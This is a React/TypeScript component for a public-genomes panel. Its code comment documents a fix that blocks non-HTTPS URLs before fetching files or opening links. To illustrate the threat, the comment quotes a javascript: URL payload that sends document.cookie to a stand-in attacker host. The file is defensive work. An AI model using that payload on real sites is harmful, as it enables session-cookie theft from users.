'use client';

import { useState, useEffect } from 'react';
import { Database, Download, ExternalLink, BarChart3 } from 'lucide-react';
import { useArkheStore, type ArkheState } from '@/store';
import type { PublicGenome } from '@/lib/supabasePublic';

/**
 * DATABASE PANEL — Public Genomes Repository
 * Professional data grid with real cloud data.
 */
export default function DatabasePanel() {
  const [selectedGenome, setSelectedGenome] = useState<string | null>(null);

  const publicGenomes     = useArkheStore((state: ArkheState) => state.publicGenomes);
  const loadPublicGenomes = useArkheStore((state: ArkheState) => state.loadPublicGenomes);
  const loadFile          = useArkheStore((state: ArkheState) => state.loadFile);

  useEffect(() => {
    loadPublicGenomes();
  }, [loadPublicGenomes]);

  const formatLength = (bp: number): string => {
    if (bp >= 1_000_000) return `${(bp / 1_000_000).toFixed(2)} Mb`;
    return `${(bp / 1_000).toFixed(1)} kb`;
  };

  // ─────────────────────────────────────────────────────────────────────────
  // FIX 2 — JavaScript URL Injection Prevention
  //
  // Root cause: `genome.file_url` was forwarded directly to `fetch()` and
  // `window.open()`. A malicious database row with:
  //   file_url: "javascript:fetch('https://attacker.example/'+document.cookie)"
  // would execute arbitrary code in the victim's browser on click.
  //
  // Fix: `assertHttpsUrl()` uses the URL constructor (handles edge-cases such
  // as leading whitespace or mixed-case schemes that a bare `startsWith`
  // would miss) and asserts `parsed.protocol === 'https:'`. Any other scheme
  // — `javascript:`, `data:`, `http:`, `ftp:` — is rejected with a typed
  // Error. The raw URL is intentionally omitted from error messages that
  // could reach the UI or logs, preventing info leakage.
  //
  // Applied to:
  //   • handleDownload()  — guards the fetch() call               (FIX 2A)
  //   • ExternalLink btn  — guards the window.open() call         (FIX 2B)
  //   • "Load Genome" btn — delegates to handleDownload()         (FIX 2A)
  // ─────────────────────────────────────────────────────────────────────────

  /**
   * Parses and validates that `raw` is an absolute HTTPS URL.
   * Throws a safe Error (no raw URL in message) if validation fails.
   */
  function assertHttpsUrl(raw: string): URL {
    let parsed: URL;
    try {
      parsed = new URL(raw);
    } catch {
      throw new Error('Genome file_url is not a valid URL.');
    }
    if (parsed.protocol !== 'https:') {
      throw new Error(
        `Blocked URL with unsafe scheme "${parsed.protocol}" — only https: is permitted.`
      );
    }
    return parsed;
  }

  // FIX 2A — validate URL before fetch()
  const handleDownload = async (genome: PublicGenome) => {
    try {
      assertHttpsUrl(genome.file_url); // throws if not https:

      const response = await fetch(genome.file_url);
      if (!response.ok) {
        throw new Error(`Failed to fetch genome: ${response.statusText}`);
      }

      const blob = await response.blob();
      const file = new File([blob], genome.name, { type: 'text/plain' });

      await loadFile(file, genome.name);
      setSelectedGenome(genome.id);
    } catch (error) {
      console.error('Failed to load genome:', error instanceof Error ? error.message : error);
    }
  };

  return (
    <div className="h-full flex flex-col bg-void">
      {/* Header */}
      <div className="px-4 py-3 border-b border-razor">
        <div className="flex items-center gap-2 mb-2">
          <Database className="w-4 h-4 text-cyan-400" />
          <h3 className="text-xs font-medium text-zinc-400 uppercase tracking-wider">
            Public Genomes
          </h3>
        </div>
        <p className="text-[10px] text-zinc-600">Reference sequences from NCBI RefSeq</p>
      </div>

      {/* Data Grid */}
      <div className="flex-1 overflow-auto">
        {/* Table Header */}
        <div className="sticky top-0 z-10 bg-void-panel border-b border-razor">
          <div className="grid grid-cols-12 gap-2 px-4 py-2 text-[9px] font-medium text-zinc-600 uppercase tracking-wider">
            <div className="col-span-4">Organism</div>
            <div className="col-span-2">Size</div>
            <div className="col-span-2">GC%</div>
            <div className="col-span-2">Genes</div>
            <div className="col-span-2"></div>
          </div>
        </div>

        {/* Table Rows */}
        <div className="divide-y divide-white/5">
          {publicGenomes.map((genome) => {
            const isSelected = selectedGenome === genome.id;

            return (
              <div
                key={genome.id}
                onClick={() => setSelectedGenome(genome.id)}
                className={`
                  grid grid-cols-12 gap-2 px-4 py-3 cursor-pointer transition-colors
                  ${isSelected
                    ? 'bg-white/5 border-l-2 border-l-cyan-400'
                    : 'hover:bg-white/[0.02]'}
                `}
              >
                {/* Organism */}
                <div className="col-span-4">
                  <div className="text-xs text-zinc-300 font-medium mb-0.5">{genome.name}</div>
                  <div className="text-[10px] text-zinc-600 font-mono">{genome.author}</div>
                </div>

                {/* Size */}
                <div className="col-span-2 flex items-center">
                  <div className="text-[11px] font-mono text-zinc-400">
                    {formatLength(genome.total_length)}
                  </div>
                </div>

                {/* GC Content */}
                <div className="col-span-2 flex items-center">
                  <div className="text-[11px] font-mono text-zinc-400">Analyze</div>
                </div>

                {/* Genes */}
                <div className="col-span-2 flex items-center">
                  <div className="text-[11px] font-mono text-zinc-400">Load to see</div>
                </div>

                {/* Actions */}
                <div className="col-span-2 flex items-center justify-end gap-1">
                  {/* Download — FIX 2A applied in handleDownload */}
                  <button
                    onClick={(e) => {
                      e.stopPropagation();
                      handleDownload(genome);
                    }}
                    className="p-1 hover:bg-white/5 rounded transition-colors"
                    title="Download genome"
                  >
                    <Download size={12} className="text-zinc-600 hover:text-zinc-400" />
                  </button>

                  {/* External link — FIX 2B: validate before window.open() */}
                  <button
                    onClick={(e) => {
                      e.stopPropagation();
                      try {
                        assertHttpsUrl(genome.file_url); // throws if not https:
                        window.open(genome.file_url, '_blank', 'noopener,noreferrer');
                      } catch (err) {
                        console.error(
                          'Navigation blocked — unsafe URL scheme:',
                          err instanceof Error ? err.message : err
                        );
                      }
                    }}
                    className="p-1 hover:bg-white/5 rounded transition-colors"
                    title="View source"
                  >
                    <ExternalLink size={12} className="text-zinc-600 hover:text-zinc-400" />
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Selected Genome Details */}
      {selectedGenome && (
        <div className="border-t border-razor p-4 bg-void-panel">
          {(() => {
            const genome = publicGenomes.find((g) => g.id === selectedGenome);
            if (!genome) return null;

            return (
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div>
                    <div className="text-xs font-medium text-zinc-300 mb-0.5">{genome.name}</div>
                    <div className="text-[10px] text-zinc-600">
                      {genome.id} • Updated {new Date(genome.created_at).toLocaleDateString()}
                    </div>
                  </div>
                </div>

                {/* Stats Grid */}
                <div className="grid grid-cols-3 gap-2">
                  <div className="p-2 bg-void border border-razor rounded">
                    <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-1">Length</div>
                    <div className="text-xs font-mono text-zinc-300">
                      {formatLength(genome.total_length)}
                    </div>
                  </div>
                  <div className="p-2 bg-void border border-razor rounded">
                    <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-1">Author</div>
                    <div className="text-xs font-mono text-zinc-300">{genome.author}</div>
                  </div>
                  <div className="p-2 bg-void border border-razor rounded">
                    <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-1">Description</div>
                    <div className="text-xs text-zinc-300">{genome.description}</div>
                  </div>
                </div>

                {/* Load Genome action — handleDownload includes FIX 2A */}
                <button
                  onClick={() => handleDownload(genome)}
                  className="w-full py-2 px-3 bg-cyan-500/10 border border-cyan-500/20 rounded-md text-xs font-medium text-cyan-400 hover:bg-cyan-500/20 transition-all uppercase tracking-wider"
                >
                  <Download size={12} className="inline mr-2" />
                  Load Genome
                </button>
              </div>
            );
          })()}
        </div>
      )}

      {/* Footer Stats */}
      <div className="px-4 py-2 border-t border-razor bg-void-panel">
        <div className="flex items-center justify-between text-[10px] text-zinc-600">
          <span>{publicGenomes.length} genomes available</span>
          <div className="flex items-center gap-1">
            <BarChart3 size={10} />
            <span>NCBI RefSeq</span>
          </div>
        </div>
      </div>
    </div>
  );
}